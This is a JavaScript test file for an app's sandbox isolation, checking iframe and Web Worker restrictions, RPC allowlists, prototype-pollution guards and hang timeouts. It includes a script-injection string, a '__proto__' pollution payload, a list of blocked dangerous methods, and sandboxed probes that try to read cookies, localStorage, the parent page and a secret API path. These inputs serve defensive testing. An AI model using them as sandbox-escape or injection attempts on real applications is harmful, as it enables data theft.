import test from 'node:test'
import assert from 'node:assert/strict'
import { spawn } from 'node:child_process'
import crypto from 'node:crypto'
import fsSync from 'node:fs'
import fs from 'node:fs/promises'
import http from 'node:http'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import vm from 'node:vm'
import {
 CAPABILITY_TOKEN_PREFIX,
 DATA_RUNTIME_ENV,
 DEFAULT_PACKAGE_ID,
 FORBIDDEN_PROPERTY_KEYS,
 OUTPUT_PROTOCOL,
 OUTPUT_RPC_METHODS,
 PRIMITIVE_TYPES,
 SECRET_MASK,
 SESSION_TOKEN_HEADER,
 SOURCE_WORKER_PROTOCOL,
 TOKEN_BOOTSTRAP_HEADER,
 agentCreateLane,
 agentEvalLane,
 agentMutateLaneInput,
 attenuateKv,
 bindSecretStoreToKv,
 buildNodePermissionExecArgs,
 buildSandboxedOutputCsp,
 buildSandboxedOutputSrcdoc,
 closePackageInSession,
 createAgentEventHub,
 createCapabilityToken,
 createDataProxyHandler,
 createFileBackedServerSecretStore,
 createIdleTracker,
 createLaneHttpServer,
 createMaskedSecretValue,
 createNewSession,
 createPackage,
 createSafeExternalFetch,
 createSandboxedOutputHost,
 createServerSecretStore,
 createSourceWorkerRunner,
 createTransport,
 decodeWireState,
 decodeWireValue,
 defaultValueForType,
 deleteLaneSecret,
 describeValue,
 detectLaneHandlers,
 dirModalSource,
 disposeIdleSourceWorkers,
 encodeKeySegment,
 encodeWireState,
 encodeWireValue,
 ensureVaultMasterKey,
 exportDeployModalSource,
 exportModalSource,
 field,
 formatImportLine,
 handleAgentApiRequest,
 handleDeployApiRequest,
 handleDeployUpgrade,
 handleFsApiRequest,
 hasImportCycle,
 hasJsonContentType,
 httpKV,
 initSessionState,
 isAllowedLocalHost,
 isAllowedLocalOrigin,
 isBlockedIpAddress,
 isForbiddenDirectKvKey,
 isMaskedSecretValue,
 isThenable,
 laneSecretKey,
 listScopeEntries,
 laneServerSource,
 laneServersModalSource,
 laneStorySource,
 laneTerminalModalSource,
 lineInfoModalSource,
 loadLaneScript,
 loadLaneSecretRecord,
 normalizePrimitiveType,
 openPackageInSession,
 packageMetaKey,
 packageModalSource,
 parse,
 parseImportLine,
 queryLaneStories,
 registerLaneInPackage,
 resolveImportValue,
 resolveLaneSecret,
 resolveScopeColumns,
 resolveScopePath,
 runLines,
 runLinesInWorker,
 runTransportedScripts,
 saveLaneScript,
 sessionModalSource,
 setLaneSecret,
 setSessionDataDir,
 simulateLaneRequestInWorker,
 validateOutputFrameMessage,
 validateOutputRpcRequest,
 validateSourceFetchUrl,
 validateSourceWorkerRpcRequest,
 vaultMasterKey,
 verifyApiSessionToken,
 verifyCapabilityToken,
} from './field.fixtures.mjs'

test('index.html removes globalThis.main and wires sandboxed iframe + Web Worker runners; sw.js precaches isolation modules', async () => {
 const indexHtml = await fs.readFile(new URL('./index.html', import.meta.url), 'utf8')
 const swSource = await fs.readFile(new URL('./sw.js', import.meta.url), 'utf8')

 assert.ok(!indexHtml.includes('globalThis.main'), 'index.html must not expose globalThis.main')
 assert.ok(!indexHtml.includes('window.main'), 'index.html must not expose window.main')
 assert.ok(indexHtml.includes('const main = field({'), 'index.html should keep main scoped to module closure')
 assert.ok(indexHtml.includes("from '/sandbox.mjs'"), 'index.html should import isolation helpers from /sandbox.mjs')
 assert.ok(indexHtml.includes('createSandboxedOutputHost'), 'index.html should pass createSandboxedOutputHost')
 assert.ok(indexHtml.includes('createSourceWorkerRunner'), 'index.html should pass createSourceWorkerRunner')
 assert.ok(indexHtml.includes('runLines: runLinesInWorker'), 'index.html should route runLines through runLinesInWorker')
 assert.ok(
  indexHtml.includes('simulateLaneRequest: simulateLaneRequestInWorker'),
  'index.html should route simulateLaneRequest through simulateLaneRequestInWorker'
 )

 assert.ok(swSource.includes("'/sandbox.mjs'"), 'sw.js should precache /sandbox.mjs')
 assert.ok(swSource.includes("'/source-worker.mjs'"), 'sw.js should precache /source-worker.mjs')

 // Verify every named ESM import in index.html resolves to an actual export on its target module
 const scriptMatch = /<script type="module">([\s\S]*?)<\/script>/.exec(indexHtml)
 assert.ok(scriptMatch, 'index.html should contain an inline <script type="module">')
 const scriptBody = scriptMatch[1]
 const importRegex = /import\s*\{([^}]+)\}\s*from\s*'(\/[^']+\.mjs)'/g
 let impMatch
 let checkedImportCount = 0
 while ((impMatch = importRegex.exec(scriptBody)) !== null) {
  const names = impMatch[1]
   .split(',')
   .map(s => s.trim())
   .filter(Boolean)
   .map(s => s.split(/\s+as\s+/)[0].trim())
  const modPath = `.${impMatch[2]}`
  const modNs = await import(new URL(modPath, import.meta.url))
  for (const exportName of names) {
   assert.ok(
    exportName in modNs,
    `index.html imports "${exportName}" from ${impMatch[2]}, which must exist`
   )
   checkedImportCount += 1
  }
 }
 assert.ok(checkedImportCount > 100, 'Should verify all index.html module imports')

 // Verify generated srcdoc inline script from real field.mjs compiles cleanly with zero syntax errors
 const rawFieldMjs = await fs.readFile(new URL('./field.mjs', import.meta.url), 'utf8')
 const inlineField = rawFieldMjs.replace(/^export\s+(const|function|async\s+function)\s+/gm, '$1 ')
 const fullSrcdoc = buildSandboxedOutputSrcdoc({ frameId: 'syntax-check', fieldModuleSource: inlineField })
 const srcdocJsMatch = /<script type="module">([\s\S]*?)<\/script>/.exec(fullSrcdoc)
 assert.ok(srcdocJsMatch)
 assert.doesNotThrow(() => new vm.Script(srcdocJsMatch[1], { filename: 'srcdoc-check.js' }))
})

test('validateOutputRpcRequest & validateOutputFrameMessage enforce strict allowlist, schema types, and prototype-pollution guards', () => {
 const frameId = 'cc-frame-test-1'

 // Every documented extraEnv helper validates cleanly with well-typed args
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 1,
   method: 'syncTable',
   args: ['chips', [{ title: 'BTC', value: '100000' }], 'title'],
  }).ok,
  true
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 2,
   method: 'readTable',
   args: ['chips'],
  }).ok,
  true
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 3,
   method: 'setSelfLine',
   args: [1, '; to x 42', false],
  }).ok,
  true
 )
 for (const zeroArgMethod of ['getSelfLines', 'getSelfMeta', 'getClockTimezone', 'getClockHourFormat', 'getClockShowSeconds']) {
  assert.equal(
   validateOutputRpcRequest({
    protocol: OUTPUT_PROTOCOL,
    frameId,
    type: 'rpc-request',
    requestId: 4,
    method: zeroArgMethod,
    args: [],
   }).ok,
   true,
   `${zeroArgMethod} should accept 0 args`
  )
  assert.equal(
   validateOutputRpcRequest({
    protocol: OUTPUT_PROTOCOL,
    frameId,
    type: 'rpc-request',
    requestId: 5,
    method: zeroArgMethod,
    args: ['unexpected'],
   }).ok,
   false,
   `${zeroArgMethod} should reject extra args`
  )
 }
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 6,
   method: 'setSelfFeatures',
   args: [{ httpServer: true, runEvery30Minutes: false }],
  }).ok,
  true
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 7,
   method: 'openLaneTab',
   args: ['Data', 'accounts'],
  }).ok,
  true
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 8,
   method: 'setClockTimezone',
   args: ['America/New_York'],
  }).ok,
  true
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 9,
   method: 'setClockHourFormat',
   args: ['24h'],
  }).ok,
  true
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 10,
   method: 'setClockShowSeconds',
   args: [false],
  }).ok,
  true
 )

 // Reject unknown / dangerous methods (including Object.prototype method names)
 for (const badMethod of ['eval', 'load', 'toString', 'constructor', '__proto__', 'deleteLane', 'setLaneSecret', 'openPackage']) {
  assert.equal(
   validateOutputRpcRequest({
    protocol: OUTPUT_PROTOCOL,
    frameId,
    type: 'rpc-request',
    requestId: 11,
    method: badMethod,
    args: [],
   }).ok,
   false,
   `Should reject method: ${badMethod}`
  )
 }

 // Reject prototype-pollution keys inside records and features
 const pollutedRecord = JSON.parse('{"title":"ok","__proto__":{"polluted":true}}')
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 12,
   method: 'syncTable',
   args: ['chips', [pollutedRecord]],
  }).ok,
  false
 )
 const constructorRecord = { title: 'ok', constructor: 'bad' }
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 13,
   method: 'syncTable',
   args: ['chips', [constructorRecord]],
  }).ok,
  false
 )

 // Reject invalid domain values
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 14,
   method: 'openLaneTab',
   args: ['admin'],
  }).ok,
  false
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 15,
   method: 'setClockTimezone',
   args: ['Invalid/Not_A_Zone'],
  }).ok,
  false
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 16,
   method: 'setSelfFeatures',
   args: [{ unknownFeature: true }],
  }).ok,
  false
 )
 assert.equal(
  validateOutputRpcRequest({
   protocol: OUTPUT_PROTOCOL,
   frameId,
   type: 'rpc-request',
   requestId: 17,
   method: 'setClockShowSeconds',
   args: ['yes'],
  }).ok,
  false
 )

 // Frame envelope & resize bounds validation
 assert.equal(validateOutputFrameMessage({ protocol: OUTPUT_PROTOCOL, frameId: 'wrong', type: 'ready' }, frameId).ok, false)
 const clampedResize = validateOutputFrameMessage({ protocol: OUTPUT_PROTOCOL, frameId, type: 'resize', height: 999999 }, frameId)
 assert.equal(clampedResize.ok, true)
 assert.equal(clampedResize.height, 50000)
 assert.equal(validateOutputFrameMessage({ protocol: OUTPUT_PROTOCOL, frameId, type: 'resize', height: -10 }, frameId).ok, false)

 // Verify srcdoc safely escapes </script sequences
 const srcdoc = buildSandboxedOutputSrcdoc({
  frameId,
  fieldModuleSource: "const dangerous = '</script><script>window.pwned=1</script>'",
 })
 assert.ok(!srcdoc.includes('</script><script>'), 'srcdoc must escape embedded </script sequences')
 assert.equal(OUTPUT_RPC_METHODS.length, 13)
})

test('Browser Lane Output <iframe sandbox="allow-scripts"> blocks parent DOM, localStorage, cookies, /api/*, load, and spoofed RPC origins', async () => {
 const hostListeners = {}
 const hostWindow = {
  secretMainToken: 'TOP_SECRET_HOST_VALUE',
  localStorage: { getItem: () => 'HOST_STORAGE_SECRET' },
  addEventListener(type, fn) {
   hostListeners[type] ||= []
   hostListeners[type].push(fn)
  },
  removeEventListener(type, fn) {
   hostListeners[type] = (hostListeners[type] || []).filter(h => h !== fn)
  },
 }
 const hostDocument = {
  cookie: 'session=secret',
  createElement(tag) {
   return {
    tag,
    style: {},
    attributes: {},
    children: [],
    setAttribute(k, v) { this.attributes[k] = v },
    remove() {},
   }
  },
 }
 const viewportEl = {
  children: [],
  appendChild(c) { this.children.push(c) },
  replaceChildren() { this.children = [] },
 }

 let rpcSyncCalls = 0
 const host = createSandboxedOutputHost({
  document: hostDocument,
  window: hostWindow,
  viewportEl,
  handlers: {
   syncTable: async (tbl, rows) => {
    rpcSyncCalls += 1
    return { ok: true, count: rows.length, added: rows.length, updated: 0 }
   },
   getSelfMeta: async () => ({ id: 'lane-sec', title: 'Sec Lane' }),
  },
 })

 try {
  const t = createTransport()
  const f = field({}, { transport: t })
  await f.run(parse([
   // 1. Probe opaque origin and attempt forbidden accesses (parent.document, localStorage, cookie, /api/data, load)
   `; send (
    ; to report ; object
    ; set $window.origin report.origin
    ; set [ ; try ( $window.localStorage ) : 'blocked-localStorage' ] report.ls
    ; set [ ; try ( $document.cookie ) : 'blocked-cookie' ] report.cookie
    ; set [ ; try ( $window.parent.document ) : 'blocked-parent-doc' ] report.parentDoc
    ; set [ ; try ( $window.parent.main ) : 'blocked-parent-main' ] report.parentMain
    ; set [ ; try ( !window.fetch '/api/data?key=secret' ) : 'blocked-relative-api' ] report.relApi
    ; set [ ; try ( !window.fetch 'http://localhost:8080/api/data?key=secret' ) : 'blocked-abs-api' ] report.absApi
    ; set [ ; try ( ; load /src/main.fs ) : 'blocked-load' ] report.loadAttempt
    ; to meta !getSelfMeta
    ; set $meta.id report.metaId
    ; to badRpc [ ; try (
     !window.Promise (
      ; to { resolve } $argv
      ; to reqId 9999
      !window.addEventListener message (
       ; to { ev } $argv
       ; condition { propertyIs 9999 ev.data.requestId } : !$resolve $ev.data
      )
      !window.parent.postMessage [ object
       { protocol '${OUTPUT_PROTOCOL}' }
       { frameId '${'wrong-or-injected'}' }
      ] '*'
     )
    ) : null ]
    ; to out !document.createElement pre
    ; set [ !JSON.stringify $report ] out.textContent
    $out
   )`,
  ].join('\n')))

  const outcome = await host.render(t.packets())
  assert.equal(outcome.results.length, 1)
  assert.equal(outcome.results[0].error, null)
  assert.equal(host.iframe.tag, 'iframe')
  assert.equal(host.iframe.attributes.sandbox, 'allow-scripts')
  assert.ok(!host.iframe.attributes.sandbox.includes('allow-same-origin'))

  const report = JSON.parse(host.debugOutputEl.children[0].textContent)
  assert.equal(report.origin, 'null')
  assert.equal(report.ls, 'blocked-localStorage')
  assert.equal(report.cookie, 'blocked-cookie')
  assert.equal(report.parentDoc, 'blocked-parent-doc')
  assert.equal(report.parentMain, 'blocked-parent-main')
  assert.equal(report.relApi, 'blocked-relative-api')
  assert.equal(report.absApi, 'blocked-abs-api')
  assert.equal(report.loadAttempt, 'blocked-load')
  assert.equal(report.metaId, 'lane-sec')

  // Spoofed message from a non-null origin or wrong source on hostWindow is ignored
  for (const listener of hostListeners.message || []) {
   await listener({
    origin: 'http://localhost:8080',
    source: host.iframe.contentWindow,
    data: {
     protocol: OUTPUT_PROTOCOL,
     frameId: host.frameId,
     type: 'rpc-request',
     requestId: 77,
     method: 'syncTable',
     args: ['chips', [{ title: 'Spoofed' }]],
    },
   })
   await listener({
    origin: 'null',
    source: {},
    data: {
     protocol: OUTPUT_PROTOCOL,
     frameId: host.frameId,
     type: 'rpc-request',
     requestId: 78,
     method: 'syncTable',
     args: ['chips', [{ title: 'WrongSource' }]],
    },
   })
  }
  assert.equal(rpcSyncCalls, 0, 'Spoofed origin and wrong source messages must never execute host RPC handlers')
 }
 finally {
  host.dispose()
 }
})

test('Source Worker isolation: no DOM/storage/ambient globals, scoped KV, external-only fetch, hard worker.terminate() on CPU & async hangs, and full UI recovery', async () => {
 // 1. Validate fetch URL and Worker RPC schema guards directly
 assert.equal(validateSourceFetchUrl('/api/data', 'http://localhost:8080').ok, false)
 assert.equal(validateSourceFetchUrl('http://localhost:8080/api/fs/roots', 'http://localhost:8080').ok, false)
 assert.equal(validateSourceFetchUrl('http://localhost:8080/index.html', 'http://localhost:8080').ok, false)
 assert.equal(validateSourceFetchUrl('http://127.0.0.1:3333/api/data', '').ok, false)
 assert.equal(validateSourceFetchUrl('ftp://example.com/file', 'http://localhost:8080').ok, false)
 assert.equal(validateSourceFetchUrl('https://api.github.com/repos/tagmein/civil-command', 'http://localhost:8080').ok, true)

 assert.equal(
  validateSourceWorkerRpcRequest({
   protocol: SOURCE_WORKER_PROTOCOL,
   type: 'rpc-request',
   runId: 1,
   requestId: 1,
   method: 'eval',
   params: {},
  }).ok,
  false
 )

 // 2. Verify Worker global scrubbing, KV root isolation, and external fetch credentials omission
 const kvMap = new Map([['lane-1.greeting', 'hi']])
 const rootLeak = { touched: false }
 const scopedKv = {
  root: {
   async get() {
    rootLeak.touched = true
    return 'ROOT_SECRET'
   },
  },
  withBasePath() {
   rootLeak.touched = true
   return this.root
  },
  namespace(sub) {
   return {
    async get(k) { return kvMap.get(`lane-1.${sub}.${k}`) ?? null },
    async set(k, v) { kvMap.set(`lane-1.${sub}.${k}`, v) },
   }
  },
  async get(k) { return kvMap.get(`lane-1.${k}`) ?? null },
  async set(k, v) { kvMap.set(`lane-1.${k}`, v) },
 }

 let capturedFetchOpts = null
 const envOutcome = await runLinesInWorker([
  '; to probe ; object',
  '; set $document probe.doc',
  '; set $window probe.win',
  '; set $localStorage probe.ls',
  '; set $indexedDB probe.idb',
  '; set $postMessage probe.pm',
  '; set $Worker probe.workerCtor',
  '; set $process probe.proc',
  '; set $data.root probe.dataRoot',
  '; set $data.withBasePath probe.dataWithBasePath',
  "; set [ ; try ( ; load /src/main.fs ) : 'load-blocked' ] probe.loadRes",
  "; set [ ; try ( !fetch '/api/fs/roots' ) : 'rel-fetch-blocked' ] probe.relFetch",
  "; set [ ; try ( !fetch 'http://localhost:8080/api/agent/sessions' ) : 'origin-fetch-blocked' ] probe.originFetch",
  '; set [ !data.get greeting ] probe.kvVal',
  "; to extRes !fetch 'https://api.example.test/ping' [ object { headers [ object { X-Test '1' } ] } ]",
  '; set [ !extRes.text ] probe.extBody',
  '$probe',
 ], {
  hostOrigin: 'http://localhost:8080',
  initialState: {
   data: scopedKv,
   fetch: async (_url, opts) => {
    capturedFetchOpts = opts
    return { ok: true, status: 200, text: async () => 'pong' }
   },
  },
 })

 const probe = envOutcome.results[envOutcome.results.length - 1].value
 assert.equal(probe.doc, undefined)
 assert.equal(probe.win, undefined)
 assert.equal(probe.ls, undefined)
 assert.equal(probe.idb, undefined)
 assert.equal(probe.pm, undefined)
 assert.equal(probe.workerCtor, undefined)
 assert.equal(probe.proc, undefined)
 assert.equal(probe.dataRoot, undefined)
 assert.equal(probe.dataWithBasePath, undefined)
 assert.equal(probe.loadRes, 'load-blocked')
 assert.equal(probe.relFetch, 'rel-fetch-blocked')
 assert.equal(probe.originFetch, 'origin-fetch-blocked')
 assert.equal(probe.kvVal, 'hi')
 assert.equal(probe.extBody, 'pong')
 assert.equal(capturedFetchOpts.credentials, 'omit')
 assert.equal(rootLeak.touched, false)

 // 3. Hard worker.terminate() on synchronous infinite loop AND recovery on next run
 const runner = createSourceWorkerRunner({ timeoutMs: 50 })
 try {
  const cpuHang = await runner.run(
   [
    '; to beforeHang 123',
    '; while { true } ( ; to spin 1 )',
    '; to afterHang 456',
   ],
   { limits: { maxLoopIterations: 0, maxSteps: 0 } }
  )
  assert.equal(cpuHang.timedOut, true)
  assert.equal(cpuHang.terminated, true)
  assert.equal(runner.terminatedCount, 1)
  assert.equal(cpuHang.results[0].value, 123)
  assert.match(cpuHang.results[1].error, /timed out after 50ms \(worker terminated\)/)
  assert.equal(cpuHang.results.length, 2)

  // Async hang also hard-terminates cleanly
  const asyncHang = await runner.run(
   ['; to hang !fetch \'https://slow.example.test/never\''],
   {
    initialState: {
     fetch: () => new Promise(() => {}),
    },
   }
  )
  assert.equal(asyncHang.timedOut, true)
  assert.equal(asyncHang.terminated, true)
  assert.equal(runner.terminatedCount, 2)
  assert.match(asyncHang.results[0].error, /timed out after 50ms \(worker terminated\)/)

  // Subsequent run on the same runner spawns a fresh Worker and succeeds immediately
  const recovered = await runner.run(['; add 19 23'])
  assert.equal(recovered.timedOut, false)
  assert.equal(recovered.terminated, false)
  assert.equal(recovered.results[0].value, 42)
 }
 finally {
  runner.dispose()
 }

 // 4. Browser globalThis.Worker lifecycle + real WebIDL MessageEvent (Object.hasOwn(ev, 'data') === false)
 const sampleEvent = new MessageEvent('message', { data: { hello: 1 } })
 assert.equal(Object.hasOwn(sampleEvent, 'data'), false, 'Real WebIDL MessageEvent has data on prototype, not own property')

 const origBrowserWorker = globalThis.Worker
 let createdBrowserWorkers = 0
 let terminatedBrowserWorkers = 0
 class MockBrowserWorker {
  constructor() {
   createdBrowserWorkers += 1
   this.listeners = new Map()
  }
  addEventListener(type, fn) {
   if (!this.listeners.has(type)) this.listeners.set(type, new Set())
   this.listeners.get(type).add(fn)
  }
  removeEventListener(type, fn) {
   this.listeners.get(type)?.delete(fn)
  }
  postMessage(msg) {
   if (msg.type === 'run' && msg.lines[0] === '; to hang true') {
    return
   }
   queueMicrotask(() => {
    const ev = new MessageEvent('message', {
     data: {
      protocol: SOURCE_WORKER_PROTOCOL,
      type: 'run-complete',
      runId: msg.runId,
      results: [{ index: 0, lineNumber: 1, source: msg.lines[0], value: 99, preview: '99', error: null, isEmpty: false, isComment: false }],
      state: encodeWireState({ out: 99 }),
      sent: [],
     },
    })
    for (const fn of this.listeners.get('message') || []) {
     fn(ev)
    }
   })
  }
  terminate() {
   terminatedBrowserWorkers += 1
  }
 }

 globalThis.Worker = MockBrowserWorker
 try {
  const bRunner = createSourceWorkerRunner({ laneId: 'browser-lane', timeoutMs: 30 })
  const r1 = await bRunner.run(['; to out 99'])
  const r2 = await bRunner.run(['; to out 99'])
  assert.equal(r1.results[0].value, 99)
  assert.equal(r2.results[0].value, 99)
  assert.equal(createdBrowserWorkers, 1, 'Dedicated browser worker is reused across sequential runs of the same lane')
  assert.equal(terminatedBrowserWorkers, 0)

  const rHang = await bRunner.run(['; to hang true'])
  assert.equal(rHang.timedOut, true)
  assert.equal(terminatedBrowserWorkers, 1, 'Timed-out browser worker must be hard-terminated via worker.terminate()')

  const r3 = await bRunner.run(['; to out 99'])
  assert.equal(r3.results[0].value, 99)
  assert.equal(createdBrowserWorkers, 2, 'Fresh dedicated browser worker spawns after timeout termination')

  bRunner.dispose()
  assert.equal(terminatedBrowserWorkers, 2, 'Disposing lane notebook terminates its dedicated browser worker')
 }
 finally {
  globalThis.Worker = origBrowserWorker
 }

 // 5. Execute source-worker.mjs browser branch inside a prototype-backed DedicatedWorkerGlobalScope with real WebIDL MessageEvents
 const rawWorkerSource = await fs.readFile(new URL('./source-worker.mjs', import.meta.url), 'utf8')
 const strippedWorkerBody = rawWorkerSource.replace(/import\s*\{[\s\S]*?\}\s*from\s*'[^']+'\n?/g, '')
 const fieldMod = await import('./field.mjs')
 const laneHttpMod = await import('./lane-http.mjs')
 const sandboxMod = await import('./sandbox.mjs')

 const workerOutbox = []
 const workerEventListeners = new Map()
 const workerScopeProto = {
  postMessage(payload) {
   workerOutbox.push(payload)
  },
  addEventListener(type, fn) {
   if (!workerEventListeners.has(type)) workerEventListeners.set(type, new Set())
   workerEventListeners.get(type).add(fn)
  },
  fetch() {
   throw new Error('Raw prototype fetch must be scrubbed')
  },
  importScripts() {
   throw new Error('importScripts must be scrubbed')
  },
  close() {},
  get caches() { return { leaked: true } },
  get indexedDB() { return { leaked: true } },
  get self() { return this },
  get origin() { return 'http://localhost:8080' },
 }
 const browserWorkerGlobal = Object.create(workerScopeProto)
 browserWorkerGlobal.BroadcastChannel = function BroadcastChannel() {}
 browserWorkerGlobal.WebSocket = function WebSocket() {}
 browserWorkerGlobal.XMLHttpRequest = function XMLHttpRequest() {}
 browserWorkerGlobal.EventTarget = globalThis.EventTarget
 browserWorkerGlobal.MessageEvent = globalThis.MessageEvent

 const workerVmCtx = vm.createContext(browserWorkerGlobal)
 browserWorkerGlobal.globalThis = vm.runInContext('globalThis', workerVmCtx)
 Object.setPrototypeOf(browserWorkerGlobal.globalThis, workerScopeProto)

 const bootFn = vm.runInContext(
  `(async (__deps) => {\nconst { cloneScopeData, compileFieldScriptLines, createExecutionBudget, defaultValueForType, field, formatValue, normalizePrimitiveType, redactSecretText, redactSecretValue, runCompiledLines, serializeTransportPacket, buildRequestObject, createResponseHelper, executeLaneHttpRequest, normalizeHttpResult, SOURCE_WORKER_PROTOCOL, decodeWireValue, encodeWireState, encodeWireValue } = __deps;\n${strippedWorkerBody}\n})`,
  workerVmCtx,
  { filename: 'browser-source-worker-sim.js' }
 )
 await bootFn({ ...fieldMod, ...laneHttpMod, ...sandboxMod })

 // Prototype and global capabilities are scrubbed, yet bound postMessage + MessageEvent listener work cleanly
 assert.equal(browserWorkerGlobal.globalThis.postMessage, undefined)
 assert.equal(browserWorkerGlobal.globalThis.fetch, undefined)
 assert.equal(browserWorkerGlobal.globalThis.WebSocket, undefined)
 assert.equal(browserWorkerGlobal.globalThis.indexedDB, undefined)
 assert.equal(workerScopeProto.postMessage, undefined)
 assert.equal(workerScopeProto.fetch, undefined)

 const runEv = new MessageEvent('message', {
  data: {
   protocol: SOURCE_WORKER_PROTOCOL,
   type: 'run',
   runId: 77,
   filename: 'webidl-lane',
   lines: ['; add 40 2'],
   includePreviews: true,
  },
 })
 for (const fn of workerEventListeners.get('message') || []) {
  fn(runEv)
 }
 await new Promise(r => setTimeout(r, 25))
 const completeMsg = workerOutbox.find(m => m && m.type === 'run-complete' && m.runId === 77)
 assert.ok(completeMsg, 'Browser Worker branch must process WebIDL MessageEvent and emit run-complete')
 assert.equal(decodeWireValue(completeMsg.results[0].value), 42)
})

test('Cross-realm wire graph codec, cross-lane will imports, simulateLaneRequestInWorker, and full lane-notebook timeout recovery', async () => {
 // 1. Cyclic objects, shared DAG nodes, masked secrets, will ASTs, Maps, Sets, TypedArrays, and __proto__ safety
 const cyclic = { label: 'root' }
 cyclic.self = cyclic
 const sharedLeaf = { tag: 'shared' }
 const secretVal = createMaskedSecretValue('apiToken', true)
 const willFn = Object.assign(function sampleWill() {}, {
  ast: [['@', 'comment', 'Computes greeting'], ['@', 'add', 'Hi ', ['@', 'get', 'argv', '0']]],
 })
 const complex = {
  cyclic,
  a: sharedLeaf,
  b: sharedLeaf,
  secretVal,
  willFn,
  map: new Map([['k', 7]]),
  set: new Set(['x', 'y']),
  bytes: new Uint8Array([1, 2, 3]),
  negZero: -0,
  nanVal: NaN,
  big: 9007199254740993n,
 }
 Object.defineProperty(complex, '__proto__', {
  value: { injected: true },
  enumerable: true,
  configurable: true,
  writable: true,
 })

 const decoded = decodeWireValue(encodeWireValue(complex))
 assert.equal(decoded.cyclic.self, decoded.cyclic)
 assert.equal(decoded.a, decoded.b)
 assert.equal(isMaskedSecretValue(decoded.secretVal), true)
 assert.equal(describeValue(decoded.secretVal).summary, SECRET_MASK)
 assert.equal(typeof decoded.willFn, 'function')
 assert.equal(describeValue(decoded.willFn).type, 'will')
 assert.equal(describeValue(decoded.willFn).detail, 'will — Computes greeting')
 assert.throws(() => decoded.willFn('Nate'), /cannot be invoked directly on the host thread/)
 assert.equal(decoded.map.get('k'), 7)
 assert.equal(decoded.set.has('y'), true)
 assert.deepEqual(Array.from(decoded.bytes), [1, 2, 3])
 assert.ok(Object.is(decoded.negZero, -0))
 assert.ok(Number.isNaN(decoded.nanVal))
 assert.equal(decoded.big, 9007199254740993n)
 assert.equal(({}).injected, undefined, 'Decoding wire objects must never pollute Object.prototype')

 // 2. Cross-lane import of a `will` function executes safely inside the importing lane's Worker
 const exportedState = decodeWireState(encodeWireState({
  doubleIt: Object.assign(function () {}, {
   ast: [['@', 'to', ['n'], ['@', 'get', 'argv']], ['@', 'multiply', ['@', 'get', 'n'], 2]],
  }),
 }))
 assert.equal(detectLaneHandlers({ get: exportedState.doubleIt }).hasHandlers, true)

 const callerOut = await runLinesInWorker(
  ['; to fn !importLane helper doubleIt', '!fn 21'],
  {
   initialState: {
    importLane: async (_id, prop) => exportedState[prop],
   },
  }
 )
 assert.equal(callerOut.results[1].value, 42)

 // 3. simulateLaneRequestInWorker isolates HTTP handler execution and hard-terminates hung handlers
 const okSim = await simulateLaneRequestInWorker({
  laneId: 'sim-api',
  lines: [
   '; to post (\n ; to { req } $argv\n ; object { docIsUndef [ propertyIs undefined document ] } { echo $req.body.msg }\n)',
  ],
  req: {
   method: 'POST',
   path: '/echo',
   headers: { 'content-type': 'application/json' },
   rawBody: JSON.stringify({ msg: 'isolated' }),
  },
 })
 assert.equal(okSim.status, 200)
 assert.deepEqual(JSON.parse(okSim.bodyText), { docIsUndef: true, echo: 'isolated' })

 const hungSim = await simulateLaneRequestInWorker({
  laneId: 'sim-hang',
  lines: ['; to get ( ; while { true } ( ; to x 1 ) )'],
  req: { method: 'GET', path: '/' },
  timeoutMs: 50,
 })
 assert.equal(hungSim.status, 504)
 assert.equal(hungSim.timedOut, true)
 assert.equal(hungSim.terminated, true)

 // 4. Full UI notebook integration: hung Source line times out in Worker, marks error preview, releases idle tracker, and recovers on edit
 const mainSource = await fs.readFile(new URL('./src/main.fs', import.meta.url), 'utf8')
 const laneSource = await fs.readFile(new URL('./src/lane-control.fs', import.meta.url), 'utf8')
 const notebookSource = await fs.readFile(new URL('./src/lane-notebook.fs', import.meta.url), 'utf8')
 const inputsSource = await fs.readFile(new URL('./src/lane-inputs.fs', import.meta.url), 'utf8')
 const scopeSource = await fs.readFile(new URL('./src/lane-scope.fs', import.meta.url), 'utf8')
 const dataSource = await fs.readFile(new URL('./src/lane-data.fs', import.meta.url), 'utf8')
 const confirmModalSource = await fs.readFile(new URL('./src/confirm-modal.fs', import.meta.url), 'utf8')
 const rowPickerModalSource = await fs.readFile(new URL('./src/lane-row-picker-modal.fs', import.meta.url), 'utf8')
 const outputSource = await fs.readFile(new URL('./src/lane-output.fs', import.meta.url), 'utf8')
 const modalSource = await fs.readFile(new URL('./src/lane-modal.fs', import.meta.url), 'utf8')
 const configModalSource = await fs.readFile(new URL('./src/lane-config-modal.fs', import.meta.url), 'utf8')
 const importModalSource = await fs.readFile(new URL('./src/lane-import-modal.fs', import.meta.url), 'utf8')
 const railsSource = await fs.readFile(new URL('./src/lane-rails.fs', import.meta.url), 'utf8')

